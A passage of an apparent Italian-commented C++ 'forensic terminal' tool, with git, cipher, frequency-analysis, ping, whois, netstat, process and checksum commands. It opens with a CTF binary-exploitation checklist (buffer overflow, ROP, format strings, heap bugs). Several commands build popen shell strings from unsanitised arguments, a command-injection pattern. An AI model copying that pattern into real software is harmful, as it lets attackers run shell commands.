            "[ ] Esegui con argomenti diversi, analizza comportamento",
        };
        for(auto& s:steps) std::cout<<Color::WHITE<<"  "<<s<<"\n"<<Color::RESET;
    } else if (type=="pwn") {
        std::vector<std::string> steps={
            "[ ] checksec binary — identifica protezioni (NX, PIE, ASLR, canary)",
            "[ ] Trova buffer overflow: input lungo, cerca offset con pwndbg",
            "[ ] ret2win: cerca funzione 'win' o simili nel binario",
            "[ ] ret2libc: se NX abilitato, usa gadget ROP",
            "[ ] Format string: %p %x %s nei campi printf",
            "[ ] Heap: use-after-free, double-free, heap overflow",
            "[ ] GOT/PLT overwrite per controllo flusso",
            "[ ] ROPgadget --binary file per trovare gadget",
            "[ ] one_gadget per trovare execve in libc",
            "[ ] pwntools per scripting exploit in Python",
        };
        for(auto& s:steps) std::cout<<Color::WHITE<<"  "<<s<<"\n"<<Color::RESET;
    }
    std::cout<<"\n";
}

// ─────────────────────────────────────────────
//  INCLUDE NUOVI COMANDI
// ─────────────────────────────────────────────
#define NEXUS_UTILS_DEFINED

// ═══════════════════════════════════════════════════════════════
//  new_commands.cpp — incluso da forensic_terminal.cpp
//  Non compilare standalone: g++ forensic_terminal.cpp
// ═══════════════════════════════════════════════════════════════
#pragma once
#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include <map>
#include <set>
#include <algorithm>
#include <functional>
#include <iomanip>
#include <cmath>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <sys/stat.h>
#include <sys/types.h>
#include <dirent.h>
#include <unistd.h>
#include <pwd.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>

// ─────────────────────────────────────────────
//  Stub per IntelliSense (in compilazione reale
//  queste sono già definite in forensic_terminal.cpp)
// ─────────────────────────────────────────────
#ifndef NEXUS_COLOR_DEFINED
#define NEXUS_COLOR_DEFINED
namespace Color {
    const std::string RESET   = "\033[0m";
    const std::string BOLD    = "\033[1m";
    const std::string RED     = "\033[31m";
    const std::string GREEN   = "\033[32m";
    const std::string YELLOW  = "\033[33m";
    const std::string BLUE    = "\033[34m";
    const std::string MAGENTA = "\033[35m";
    const std::string CYAN    = "\033[36m";
    const std::string WHITE   = "\033[37m";
    const std::string BRED    = "\033[1;31m";
    const std::string BGREEN  = "\033[1;32m";
    const std::string BYELLOW = "\033[1;33m";
    const std::string BCYAN   = "\033[1;36m";
    const std::string BWHITE  = "\033[1;37m";
    const std::string DIM     = "\033[2m";
    const std::string BG_RED  = "\033[41m";
    const std::string BG_DARK = "\033[40m";
}
#endif

#ifndef NEXUS_UTILS_DEFINED
#define NEXUS_UTILS_DEFINED

inline std::string toLower(std::string s) {
    std::transform(s.begin(), s.end(), s.begin(), ::tolower);
    return s;
}

inline std::string trim(const std::string& s) {
    size_t start = s.find_first_not_of(" \t\r\n");
    size_t end   = s.find_last_not_of(" \t\r\n");
    return (start == std::string::npos) ? "" : s.substr(start, end - start + 1);
}

inline std::vector<std::string> split(const std::string& s, char delim = ' ') {
    std::vector<std::string> tokens;
    std::string tok;
    std::istringstream ss(s);
    while (std::getline(ss, tok, delim))
        if (!tok.empty()) tokens.push_back(tok);
    return tokens;
}

inline std::string humanSize(off_t bytes) {
    const char* units[] = {"B","KB","MB","GB","TB"};
    double size = (double)bytes;
    int u = 0;
    while (size >= 1024.0 && u < 4) { size /= 1024.0; ++u; }
    std::ostringstream oss;
    oss << std::fixed << std::setprecision(2) << size << " " << units[u];
    return oss.str();
}

inline std::string permString(mode_t mode) {
    std::string p = "----------";
    if (S_ISDIR(mode))  p[0] = 'd';
    if (S_ISLNK(mode))  p[0] = 'l';
    if (mode & S_IRUSR) p[1] = 'r'; if (mode & S_IWUSR) p[2] = 'w'; if (mode & S_IXUSR) p[3] = 'x';
    if (mode & S_IRGRP) p[4] = 'r'; if (mode & S_IWGRP) p[5] = 'w'; if (mode & S_IXGRP) p[6] = 'x';
    if (mode & S_IROTH) p[7] = 'r'; if (mode & S_IWOTH) p[8] = 'w'; if (mode & S_IXOTH) p[9] = 'x';
    return p;
}

inline std::string timeStr(time_t t) {
    char buf[64];
    struct tm* tm_info = localtime(&t);
    strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M:%S", tm_info);
    return std::string(buf);
}

inline std::string base64Encode(const std::string& in) {
    const std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string out; int val=0, bits=-6;
    for (unsigned char c : in) {
        val = (val << 8) + c; bits += 8;
        while (bits >= 0) { out += chars[(val >> bits) & 0x3F]; bits -= 6; }
    }
    if (bits > -6) out += chars[((val << 8) >> (bits+8)) & 0x3F];
    while (out.size() % 4) out += '=';
    return out;
}

struct FileEntry {
    std::string path;
    off_t size;
    time_t mtime;
    mode_t mode;
};

inline void scanDir(const std::string& dir, std::vector<FileEntry>& results,
                    const std::string& extFilter, bool recursive, int depth=0) {
    DIR* d = opendir(dir.c_str()); if (!d) return;
    struct dirent* entry;
    while ((entry = readdir(d)) != nullptr) {
        std::string name = entry->d_name;
        if (name == "." || name == "..") continue;
        std::string full = dir + "/" + name;
        struct stat st; if (stat(full.c_str(), &st) != 0) continue;
        if (S_ISDIR(st.st_mode)) { if (recursive) scanDir(full, results, extFilter, true, depth+1); }
        else {
            if (!extFilter.empty()) {
                std::string ext;
                auto dot = name.rfind('.');
                if (dot != std::string::npos) ext = toLower(name.substr(dot));
                if (ext != extFilter) continue;
            }
            results.push_back({full, st.st_size, st.st_mtime, st.st_mode});
        }
    }
    closedir(d);
}

// Forward declarations MD5 / SHA256
struct MD5 {
    void update(const uint8_t* data, size_t len);
    std::string digest();
    static std::string hashFile(const std::string& path);
};
struct SHA256 {
    void update(const uint8_t* data, size_t len);
    std::string digest();
    static std::string hashFile(const std::string& path);
};

#endif // NEXUS_UTILS_DEFINED

// ═══════════════════════════════════════════════════════════════
//  GIT — wrapper completo
// ═══════════════════════════════════════════════════════════════
void cmdGit(const std::vector<std::string>& args) {
    // Ricostruisce la riga completa git ...
    std::string gitcmd = "git";
    for (size_t i = 1; i < args.size(); i++) gitcmd += " " + args[i];

    // Subcomandi solo-help (no exec)
    if (args.size() == 1 || (args.size() == 2 && (args[1]=="--help"||args[1]=="help"))) {
        std::cout << Color::CYAN << "\n  ╔══════════════════════════════════════════════════════════╗\n";
        std::cout << "  ║              GIT — COMANDI PRINCIPALI                    ║\n";
        std::cout << "  ╠══════════════════════════════════════════════════════════╣\n" << Color::RESET;
        auto g = [](const std::string& c, const std::string& d){
            std::cout << Color::CYAN << "  ║ " << Color::BYELLOW << std::left << std::setw(32) << c
                      << Color::WHITE << std::setw(25) << d << Color::CYAN << "║\n" << Color::RESET;
        };
        auto gs = [](const std::string& t){
            std::cout << Color::CYAN << "  ╠══════════════════════════════════════════════════════════╣\n"
                      << "  ║ " << Color::BRED << std::left << std::setw(57) << ("  ─ "+t+" ─")
                      << Color::CYAN << "║\n"
                      << "  ╠══════════════════════════════════════════════════════════╣\n" << Color::RESET;
        };
        gs("SETUP & CONFIGURAZIONE");
        g("git init [dir]",              "Crea repository");
        g("git clone <url> [dir]",       "Clona repository");
        g("git config user.name <n>",    "Imposta nome utente");
        g("git config user.email <e>",   "Imposta email");
        g("git config --list",           "Mostra configurazione");
        g("git config --global ...",     "Config globale");
        gs("STAGING & COMMIT");
        g("git status",                  "Stato working tree");
        g("git add <file>",              "Aggiungi al staging");
        g("git add .",                   "Aggiungi tutto");
        g("git add -p",                  "Staging interattivo (hunk)");
        g("git commit -m \"msg\"",       "Crea commit");
        g("git commit --amend",          "Modifica ultimo commit");
        g("git commit -a -m \"msg\"",    "Add + commit tracked files");
        g("git diff",                    "Diff working vs staging");
        g("git diff --staged",           "Diff staging vs HEAD");
        g("git diff <branch>",           "Diff vs branch");
        gs("BRANCH & MERGE");
        g("git branch",                  "Lista branch locali");
        g("git branch -a",               "Lista tutti i branch");
        g("git branch <nome>",           "Crea branch");
        g("git branch -d <nome>",        "Elimina branch");
        g("git branch -D <nome>",        "Forza eliminazione branch");
        g("git checkout <branch>",       "Cambia branch");
        g("git checkout -b <nome>",      "Crea e cambia branch");
        g("git switch <branch>",         "Cambia branch (moderno)");
        g("git switch -c <nome>",        "Crea e cambia (moderno)");
        g("git merge <branch>",          "Merge branch");
        g("git merge --no-ff <branch>",  "Merge senza fast-forward");
        g("git merge --squash <branch>", "Merge squash");
        g("git rebase <branch>",         "Rebase su branch");
        g("git rebase -i HEAD~N",        "Rebase interattivo N commit");
        g("git cherry-pick <hash>",      "Applica commit specifico");
        gs("REMOTE");
        g("git remote -v",               "Lista remote");
        g("git remote add <n> <url>",    "Aggiungi remote");
        g("git remote remove <nome>",    "Rimuovi remote");
        g("git remote rename <o> <n>",   "Rinomina remote");
        g("git fetch [remote]",          "Scarica da remote");
        g("git fetch --all",             "Scarica da tutti i remote");
        g("git pull",                    "Fetch + merge");
        g("git pull --rebase",           "Fetch + rebase");
        g("git push <remote> <branch>",  "Pusha branch");
        g("git push -u origin <branch>", "Push + set upstream");
        g("git push --force-with-lease", "Push forzato (sicuro)");
        g("git push origin --delete <b>","Elimina branch remoto");
        gs("HISTORY & LOG");
        g("git log",                     "Log commit");
        g("git log --oneline",           "Log compatto");
        g("git log --graph --all",       "Log grafico tutti branch");
        g("git log --author=<nome>",     "Log per autore");
        g("git log --since=<data>",      "Log dal giorno");
        g("git log -p <file>",           "Log con diff per file");
        g("git log --stat",              "Log con statistiche file");
        g("git show <hash>",             "Mostra commit specifico");
        g("git blame <file>",            "Chi ha scritto ogni riga");
        g("git shortlog -sn",            "Commit per autore");
        g("git reflog",                  "Storia di HEAD (tutto)");
        gs("UNDOING & RESET");
        g("git restore <file>",          "Ripristina file");
        g("git restore --staged <file>", "De-staging file");
        g("git reset HEAD~1",            "Annulla ultimo commit (soft)");
        g("git reset --hard HEAD~1",     "Annulla + scarta modifiche");
        g("git reset --hard <hash>",     "Reset a commit specifico");
        g("git revert <hash>",           "Nuovo commit che annulla");
        g("git clean -fd",               "Rimuovi file untracked");
        g("git clean -fdx",              "Rimuovi anche file ignorati");
        gs("STASH");
        g("git stash",                   "Salva modifiche temporanee");
        g("git stash push -m \"msg\"",   "Stash con messaggio");
        g("git stash list",              "Lista stash");
        g("git stash pop",               "Applica e rimuovi stash");
        g("git stash apply stash@{N}",   "Applica stash specifico");
        g("git stash drop stash@{N}",    "Elimina stash specifico");
        g("git stash clear",             "Elimina tutti gli stash");
        g("git stash branch <nome>",     "Crea branch da stash");
        gs("TAG & RELEASE");
        g("git tag",                     "Lista tag");
        g("git tag <nome>",              "Crea tag leggero");
        g("git tag -a <v> -m \"msg\"",   "Crea tag annotato");
        g("git tag -d <nome>",           "Elimina tag locale");
        g("git push origin <tag>",       "Pusha tag");
        g("git push origin --tags",      "Pusha tutti i tag");
        g("git push origin :refs/tags/<t>","Elimina tag remoto");
        gs("SEARCH & GREP");
        g("git grep <pattern>",          "Cerca nel codice");
        g("git grep -n <pattern>",       "Cerca con num riga");
        g("git log -S <stringa>",        "Cerca chi ha aggiunto str");
        g("git log -G <regex>",          "Cerca con regex nel diff");
        g("git log --all --full-hist <f>","Storia completa file");
        gs("SUBMODULE & SUBTREE");
        g("git submodule add <url>",     "Aggiungi submodule");
        g("git submodule update --init", "Inizializza submodules");
        g("git submodule foreach <cmd>", "Esegui in ogni submodule");
        g("git subtree add <url> <b>",   "Aggiungi subtree");
        gs("WORKTREE");
        g("git worktree add <dir> <b>",  "Checkout multipli");
        g("git worktree list",           "Lista worktree");
        g("git worktree remove <dir>",   "Rimuovi worktree");
        gs("BISECT (trova regressioni)");
        g("git bisect start",            "Avvia bisect");
        g("git bisect bad",              "Commit corrente è bugged");
        g("git bisect good <hash>",      "Questo commit era ok");
        g("git bisect reset",            "Termina bisect");
        gs("SICUREZZA & AUDIT");
        g("git log --all --oneline",     "Audit completo storia");
        g("git verify-commit <hash>",    "Verifica firma GPG commit");
        g("git verify-tag <tag>",        "Verifica firma GPG tag");
        g("git fsck",                    "Controlla integrità repo");
        g("git gc",                      "Garbage collection repo");
        g("git filter-branch ...",       "Riscrittura storia (legacy)");
        g("git filter-repo ...",         "Riscrittura storia (moderno)");
        g("git secret hide",             "Cifra secrets (git-secret)");
        g("git secret reveal",           "Decifra secrets");
        std::cout << Color::CYAN << "  ╠══════════════════════════════════════════════════════════╣\n";
        std::cout << "  ║ " << Color::DIM << "  Usa: git <subcomando> [args] per eseguire          " << Color::CYAN << "  ║\n";
        std::cout << "  ╚══════════════════════════════════════════════════════════╝\n" << Color::RESET << "\n";
        return;
    }

    // Esegui il comando git reale con popen
    std::cout << Color::DIM << "\n  $ " << gitcmd << Color::RESET << "\n";
    std::cout << Color::DIM << "  " << std::string(60, '-') << Color::RESET << "\n";
    FILE* pipe = popen((gitcmd + " 2>&1").c_str(), "r");
    if (!pipe) { std::cout << Color::RED << "  Impossibile eseguire git. È installato?\n" << Color::RESET; return; }
    char buf[256];
    bool hasOutput = false;
    while (fgets(buf, sizeof(buf), pipe)) {
        std::string line(buf);
        // Colorazione intelligente dell'output git
        if (line.find("error:")!=std::string::npos || line.find("fatal:")!=std::string::npos)
            std::cout << Color::BRED;
        else if (line.find("warning:")!=std::string::npos)
            std::cout << Color::YELLOW;
        else if (line[0]=='+' || line.find("new file")!=std::string::npos)
            std::cout << Color::GREEN;
        else if (line[0]=='-' || line.find("deleted")!=std::string::npos)
            std::cout << Color::RED;
        else if (line.find("commit ")!=std::string::npos || line.find("HEAD")!=std::string::npos)
            std::cout << Color::YELLOW;
        else if (line.find("branch")!=std::string::npos)
            std::cout << Color::CYAN;
        else
            std::cout << Color::WHITE;
        std::cout << "  " << line << Color::RESET;
        hasOutput = true;
    }
    int ret = pclose(pipe);
    if (!hasOutput) std::cout << Color::DIM << "  (nessun output)\n" << Color::RESET;
    if (ret != 0) std::cout << Color::YELLOW << "  [exit code: " << (ret>>8) << "]\n" << Color::RESET;
    std::cout << "\n";
}

// ═══════════════════════════════════════════════════════════════
//  FREQ — analisi frequenza caratteri (crittanalisi classica)
// ═══════════════════════════════════════════════════════════════
void cmdFreq(const std::vector<std::string>& args) {
    if (args.size() < 2) { std::cout << Color::YELLOW << "Uso: freq <file|testo>\n" << Color::RESET; return; }

    std::string input;
    // Prova come file
    std::ifstream f(args[1]);
    if (f) { std::string l; while(std::getline(f,l)) input+=l+"\n"; }
    else { for(size_t i=1;i<args.size();i++){if(i>1)input+=' ';input+=args[i];} }

    std::map<char,int> freq;
    int total=0;
    for(char c:input) if(isalpha(c)){freq[tolower(c)]++;total++;}

    std::cout << Color::CYAN << "\n  📊 ANALISI FREQUENZA CARATTERI\n" << Color::RESET;
    std::cout << Color::DIM << "  Totale lettere: " << total << "\n";
    std::cout << "  Frequenza IT/EN: E>A>I>O>N>L>T>S>R>C\n";
    std::cout << "  " << std::string(50,'-') << "\n" << Color::RESET;

    // Ordina per frequenza
    std::vector<std::pair<int,char>> sorted;
    for(auto& p:freq) sorted.push_back({p.second,p.first});
    std::sort(sorted.rbegin(),sorted.rend());

    // Riferimento inglese
    std::string en_order = "etaoinshrdlcumwfgypbvkjxqz";
    int rank=0;
    for(auto& p:sorted) {
        double pct = total>0?(double)p.first/total*100:0;
        int bars = (int)(pct/100.0*40);
        char en_eq = (rank<(int)en_order.size()) ? en_order[rank] : '?';
        std::cout << Color::YELLOW << "  " << (char)toupper(p.second) << " "
                  << Color::GREEN << std::string(bars,'#') << Color::DIM << std::string(40-bars,'-')
                  << Color::WHITE << " " << std::fixed << std::setprecision(1) << pct << "%"
                  << Color::DIM << "  (EN→" << (char)toupper(en_eq) << ")" << Color::RESET << "\n";
        rank++;
        if(rank>=16) break;
    }
    // IC (Index of Coincidence)
    double ic=0;
    if(total>1){
        for(auto& p:freq) ic+=((double)p.second*(p.second-1))/(total*(total-1));
    }
    std::cout << Color::YELLOW << "\n  IC: " << Color::WHITE << std::fixed << std::setprecision(4) << ic;
    std::cout << Color::DIM << "  (IT≈0.0738, EN≈0.0667, random≈0.0385)\n";
    if(ic>0.065) std::cout << Color::GREEN << "  → Probabile monoalfabetico (Caesar, Atbash, ...)\n";
    else if(ic>0.045) std::cout << Color::YELLOW << "  → Probabile polialfabetico (Vigenere, ...)\n";
    else std::cout << Color::CYAN << "  → Alta casualità (OTP, moderno, ...)\n";
    std::cout << Color::RESET << "\n";
}

// ═══════════════════════════════════════════════════════════════
//  CIPHER — cifrari classici (Caesar, Atbash, Vigenere, Rail)
// ═══════════════════════════════════════════════════════════════
void cmdCipher(const std::vector<std::string>& args) {
    if (args.size() < 3) {
        std::cout << Color::YELLOW << "Uso:\n"
                  << "  cipher caesar <shift> <testo>\n"
                  << "  cipher atbash <testo>\n"
                  << "  cipher vigenere <key> <testo>\n"
                  << "  cipher vigenere-dec <key> <testo>\n"
                  << "  cipher brute <testo>   (Caesar brute-force)\n"
                  << "  cipher morse <testo>   (encode)\n"
                  << "  cipher morse-dec <morse> (decode)\n" << Color::RESET;
        return;
    }
    std::string type = toLower(args[1]);
    std::cout << Color::CYAN << "\n  🔐 CIPHER [" << type << "]\n" << Color::RESET;
    std::cout << Color::DIM << "  " << std::string(55,'-') << "\n" << Color::RESET;

    // Ricostruisce testo
    std::string text;
    int keyShift = 0;
    std::string vigenKey;
    size_t textStart = 2;
    if (type=="caesar"||type=="brute") {
        if (type=="caesar") { keyShift=std::stoi(args[2]); textStart=3; }
        else { textStart=2; }
    } else if (type=="vigenere"||type=="vigenere-dec") {
        vigenKey=args[2]; textStart=3;
    } else { textStart=2; }
    for(size_t i=textStart;i<args.size();i++){if(i>textStart)text+=' ';text+=args[i];}

    // Morse table
    std::map<char,std::string> morseEnc = {
        {'A',".-"},{'B',"-..."},{'C',"-.-."},{'D',"-.."},{'E',"."},{'F',"..-."},
        {'G',"--."},{'H',"...."},{'I',".."},{'J',".---"},{'K',"-.-"},{'L',".-.."},
        {'M',"--"},{'N',"-."},{'O',"---"},{'P',".--."},{'Q',"--.-"},{'R',".-."},
        {'S',"..."},{'T',"-"},{'U',"..-"},{'V',"...-"},{'W',".--"},{'X',"-..-"},
        {'Y',"-.--"},{'Z',"--.."},{'0',"-----"},{'1',".----"},{'2',"..---"},
        {'3',"...--"},{'4',"....-"},{'5',"....."},{'6',"-...."},{'7',"--..."},
        {'8',"---.."},{'9',"----."},
    };
    std::map<std::string,char> morseDec;
    for(auto& p:morseEnc) morseDec[p.second]=p.first;

    if (type=="caesar") {
        std::string out;
        for(char c:text){
            if(isupper(c)) out+=(char)(((c-'A'+keyShift+26)%26)+'A');
            else if(islower(c)) out+=(char)(((c-'a'+keyShift+26)%26)+'a');
            else out+=c;
        }
        std::cout << Color::YELLOW << "  Input : " << Color::WHITE << text << "\n";
        std::cout << Color::YELLOW << "  Shift : " << Color::WHITE << keyShift << "\n";
        std::cout << Color::YELLOW << "  Output: " << Color::GREEN << out << Color::RESET << "\n";
    }
    else if (type=="brute") {
        std::cout << Color::YELLOW << "  Input : " << Color::WHITE << text << "\n\n";
        for(int s=1;s<26;s++){
            std::string out;
            for(char c:text){
                if(isupper(c)) out+=(char)(((c-'A'+s)%26)+'A');
                else if(islower(c)) out+=(char)(((c-'a'+s)%26)+'a');
                else out+=c;
            }
            std::cout << Color::DIM << "  ROT" << std::setw(2) << s << " " << Color::WHITE << out << Color::RESET << "\n";
        }
    }
    else if (type=="atbash") {
        std::string out;
        for(char c:text){
            if(isupper(c)) out+=(char)('Z'-(c-'A'));
            else if(islower(c)) out+=(char)('z'-(c-'a'));
            else out+=c;
        }
        std::cout << Color::YELLOW << "  Input : " << Color::WHITE << text << "\n";
        std::cout << Color::YELLOW << "  Output: " << Color::GREEN << out << Color::RESET << "\n";
    }
    else if (type=="vigenere"||type=="vigenere-dec") {
        std::string out; int ki=0;
        std::string key=toLower(vigenKey);
        for(char c:text){
            if(isalpha(c)){
                int shift=key[ki%key.size()]-'a';
                if(type=="vigenere-dec") shift=(26-shift)%26;
                if(isupper(c)) out+=(char)(((c-'A'+shift)%26)+'A');
                else out+=(char)(((c-'a'+shift)%26)+'a');
                ki++;
            } else out+=c;
        }
        std::cout << Color::YELLOW << "  Input : " << Color::WHITE << text << "\n";
        std::cout << Color::YELLOW << "  Key   : " << Color::WHITE << vigenKey << "\n";
        std::cout << Color::YELLOW << "  Output: " << Color::GREEN << out << Color::RESET << "\n";
    }
    else if (type=="morse") {
        std::string out;
        for(char c:text){
            if(c==' '){out+="/ ";}
            else{
                char cu=toupper(c);
                if(morseEnc.count(cu)) out+=morseEnc[cu]+" ";
                else out+="? ";
            }
        }
        std::cout << Color::YELLOW << "  Input : " << Color::WHITE << text << "\n";
        std::cout << Color::YELLOW << "  Morse : " << Color::GREEN << out << Color::RESET << "\n";
    }
    else if (type=="morse-dec") {
        std::string out; std::istringstream ss(text); std::string tok;
        while(ss>>tok){
            if(tok=="/") out+=' ';
            else if(morseDec.count(tok)) out+=morseDec[tok];
            else out+='?';
        }
        std::cout << Color::YELLOW << "  Morse : " << Color::WHITE << text << "\n";
        std::cout << Color::YELLOW << "  Output: " << Color::GREEN << out << Color::RESET << "\n";
    }
    std::cout << "\n";
}

// ═══════════════════════════════════════════════════════════════
//  PING — ping ICMP tramite sistema
// ═══════════════════════════════════════════════════════════════
void cmdPing(const std::vector<std::string>& args) {
    if (args.size() < 2) { std::cout << Color::YELLOW << "Uso: ping <host> [count]\n" << Color::RESET; return; }
    std::string host = args[1];
    std::string count = (args.size()>=3) ? args[2] : "4";
    std::cout << Color::CYAN << "\n  📡 PING: " << Color::WHITE << host << "\n" << Color::RESET;
    std::cout << Color::DIM << "  " << std::string(55,'-') << "\n" << Color::RESET;
#ifdef __APPLE__
    std::string cmd = "ping -c " + count + " " + host + " 2>&1";
#else
    std::string cmd = "ping -c " + count + " -W 2 " + host + " 2>&1";
#endif
    FILE* p = popen(cmd.c_str(),"r"); if(!p) return;
    char buf[256];
    while(fgets(buf,sizeof(buf),p)){
        std::string l(buf);
        if(l.find("bytes from")!=std::string::npos) std::cout<<Color::GREEN;
        else if(l.find("Request timeout")!=std::string::npos||l.find("unreachable")!=std::string::npos) std::cout<<Color::RED;
        else if(l.find("rtt")!=std::string::npos||l.find("round-trip")!=std::string::npos) std::cout<<Color::YELLOW;
        else std::cout<<Color::WHITE;
        std::cout<<"  "<<l<<Color::RESET;
    }
    pclose(p);
    std::cout<<"\n";
}

// ═══════════════════════════════════════════════════════════════
//  TRACEROUTE — traceroute/tracert tramite sistema
// ═══════════════════════════════════════════════════════════════
void cmdTraceroute(const std::vector<std::string>& args) {
    if (args.size() < 2) { std::cout << Color::YELLOW << "Uso: traceroute <host>\n" << Color::RESET; return; }
    std::string host = args[1];
    std::cout << Color::CYAN << "\n  🗺  TRACEROUTE: " << Color::WHITE << host << "\n" << Color::RESET;
    std::cout << Color::DIM << "  " << std::string(55,'-') << "\n" << Color::RESET;
#ifdef __APPLE__
    std::string cmd = "traceroute -m 20 " + host + " 2>&1";
#else
    std::string cmd = "traceroute -m 20 -w 2 " + host + " 2>&1";
#endif
    FILE* p = popen(cmd.c_str(),"r"); if(!p){
        std::cout<<Color::RED<<"  traceroute non disponibile.\n"<<Color::RESET; return;
    }
    char buf[256]; int hop=0;
    while(fgets(buf,sizeof(buf),p)){
        std::string l(buf);
        if(l[0]==' '&&isdigit(l[1])) hop++;
        if(l.find("* * *")!=std::string::npos) std::cout<<Color::DIM;
        else if(hop%2==0) std::cout<<Color::WHITE;
        else std::cout<<Color::CYAN;
        std::cout<<"  "<<l<<Color::RESET;
    }
    pclose(p);
    std::cout<<"\n";
}

// ═══════════════════════════════════════════════════════════════
//  WHOIS — whois via TCP porta 43
// ═══════════════════════════════════════════════════════════════
void cmdWhois(const std::vector<std::string>& args) {
    if (args.size() < 2) { std::cout << Color::YELLOW << "Uso: whois <dominio|ip>\n" << Color::RESET; return; }
    std::string target = args[1];
    std::cout << Color::CYAN << "\n  🔎 WHOIS: " << Color::WHITE << target << "\n" << Color::RESET;
    std::cout << Color::DIM << "  " << std::string(55,'-') << "\n" << Color::RESET;

    // Usa whois di sistema
    FILE* p = popen(("whois " + target + " 2>&1").c_str(), "r");
    if (!p) { std::cout<<Color::RED<<"  whois non disponibile.\n"<<Color::RESET; return; }
    char buf[512]; int lines=0;
    while(fgets(buf,sizeof(buf),p)&&lines<80){
        std::string l(buf); lines++;
        if(l[0]=='%'||l[0]=='#') { std::cout<<Color::DIM<<"  "<<l<<Color::RESET; continue; }
        auto colon=l.find(':');
        if(colon!=std::string::npos){
            std::string key=trim(l.substr(0,colon));
            std::string val=trim(l.substr(colon+1));
            // Evidenzia campi importanti
            bool imp=(key=="Registrant"||key=="Admin"||key=="Name Server"||key=="Expiry Date"||
                      key=="Creation Date"||key=="Updated Date"||key=="Registrar"||
                      key=="NetRange"||key=="Organization"||key=="CIDR"||key=="Country");
            std::cout<<(imp?Color::YELLOW:Color::DIM)<<"  "<<std::left<<std::setw(22)<<key
                     <<(imp?Color::WHITE:Color::WHITE)<<" "<<val<<Color::RESET;
        } else {
            std::cout<<Color::WHITE<<"  "<<l<<Color::RESET;
        }
    }
    pclose(p);
    std::cout<<"\n";
}

// ═══════════════════════════════════════════════════════════════
//  NETSTAT — connessioni attive via /proc/net
// ═══════════════════════════════════════════════════════════════
void cmdNetstat(const std::vector<std::string>& args) {
    std::cout << Color::CYAN << "\n  📶 CONNESSIONI DI RETE\n" << Color::RESET;
    std::cout << Color::DIM << "  " << std::string(65,'-') << "\n" << Color::RESET;
    // Usa netstat o ss di sistema
    std::string cmd;
    FILE* test = popen("which ss 2>/dev/null","r");
    char tbuf[64]={0}; if(fgets(tbuf,sizeof(tbuf),test)) cmd="ss -tunapl 2>&1";
    pclose(test);
    if(cmd.empty()){
        FILE* t2=popen("which netstat 2>/dev/null","r");
        char t2buf[64]={0}; if(fgets(t2buf,sizeof(t2buf),t2)) cmd="netstat -tunapl 2>&1";
        pclose(t2);
    }
    if(cmd.empty()){std::cout<<Color::RED<<"  ss/netstat non trovato.\n"<<Color::RESET;return;}

    FILE* p=popen(cmd.c_str(),"r"); if(!p) return;
    char buf[512]; bool head=true;
    while(fgets(buf,sizeof(buf),p)){
        std::string l(buf);
        if(head){ std::cout<<Color::BYELLOW<<"  "<<l<<Color::RESET; head=false; continue; }
        if(l.find("LISTEN")!=std::string::npos) std::cout<<Color::GREEN;
        else if(l.find("ESTABLISHED")!=std::string::npos) std::cout<<Color::CYAN;
        else if(l.find("TIME_WAIT")!=std::string::npos||l.find("CLOSE_WAIT")!=std::string::npos) std::cout<<Color::YELLOW;
        else std::cout<<Color::WHITE;
        std::cout<<"  "<<l<<Color::RESET;
    }
    pclose(p);
    std::cout<<"\n";
}

// ═══════════════════════════════════════════════════════════════
//  PROCESSES — lista processi (ps)
// ═══════════════════════════════════════════════════════════════
void cmdProcesses(const std::vector<std::string>& args) {
    std::string filter = (args.size()>=2) ? args[1] : "";
    std::cout << Color::CYAN << "\n  ⚙️  PROCESSI" << (filter.empty()?"":" [filtro: "+filter+"]") << "\n" << Color::RESET;
    std::cout << Color::DIM << "  " << std::string(65,'-') << "\n" << Color::RESET;
    std::string cmd = "ps aux 2>&1";
    FILE* p=popen(cmd.c_str(),"r"); if(!p) return;
    char buf[512]; bool head=true;
    while(fgets(buf,sizeof(buf),p)){
        std::string l(buf);
        if(!filter.empty() && !head && l.find(filter)==std::string::npos) continue;
        if(head){ std::cout<<Color::BYELLOW<<"  "<<l<<Color::RESET; head=false; continue; }
        // Evidenzia processi con alta CPU/MEM
        std::istringstream ss(l); std::string user,pid,cpu,mem;
        ss>>user>>pid>>cpu>>mem;
        double cpuVal=0; try{cpuVal=std::stod(cpu);}catch(...){}
        if(cpuVal>10.0) std::cout<<Color::RED;
        else if(cpuVal>2.0) std::cout<<Color::YELLOW;
        else std::cout<<Color::WHITE;
        std::cout<<"  "<<l<<Color::RESET;
    }
    pclose(p);
    std::cout<<"\n";
}

// ═══════════════════════════════════════════════════════════════
//  CHECKSUM — CRC32 + Adler32
// ═══════════════════════════════════════════════════════════════
uint32_t crc32_table[256];
bool crc32_init = false;
void initCrc32() {
    if(crc32_init) return;
    for(uint32_t i=0;i<256;i++){
        uint32_t c=i;
        for(int j=0;j<8;j++) c=(c&1)?(0xEDB88320^(c>>1)):(c>>1);
        crc32_table[i]=c;
    }
    crc32_init=true;
}
uint32_t computeCrc32(const uint8_t* data, size_t len) {
    initCrc32();
    uint32_t c=0xFFFFFFFF;
    for(size_t i=0;i<len;i++) c=crc32_table[(c^data[i])&0xFF]^(c>>8);
    return c^0xFFFFFFFF;
}
void cmdChecksum(const std::vector<std::string>& args) {
    if(args.size()<2){std::cout<<Color::YELLOW<<"Uso: checksum <file>\n"<<Color::RESET;return;}
    std::ifstream f(args[1],std::ios::binary);
    if(!f){std::cout<<Color::RED<<"File non trovato.\n"<<Color::RESET;return;}
    std::vector<uint8_t> data; char c; while(f.get(c)) data.push_back((uint8_t)c);

    uint32_t crc=computeCrc32(data.data(),data.size());
    // Adler32
    uint32_t a=1,b=0;
    for(uint8_t byte:data){a=(a+byte)%65521;b=(b+a)%65521;}
    uint32_t adler=(b<<16)|a;

    std::cout<<Color::CYAN<<"\n  ✅ CHECKSUM: "<<args[1]<<"\n"<<Color::RESET;
    std::cout<<Color::DIM<<"  "<<std::string(50,'-')<<"\n"<<Color::RESET;
    std::cout<<Color::YELLOW<<"  CRC-32  : "<<Color::GREEN<<std::hex<<std::uppercase<<std::setw(8)<<std::setfill('0')<<crc<<std::dec<<Color::RESET<<"\n";
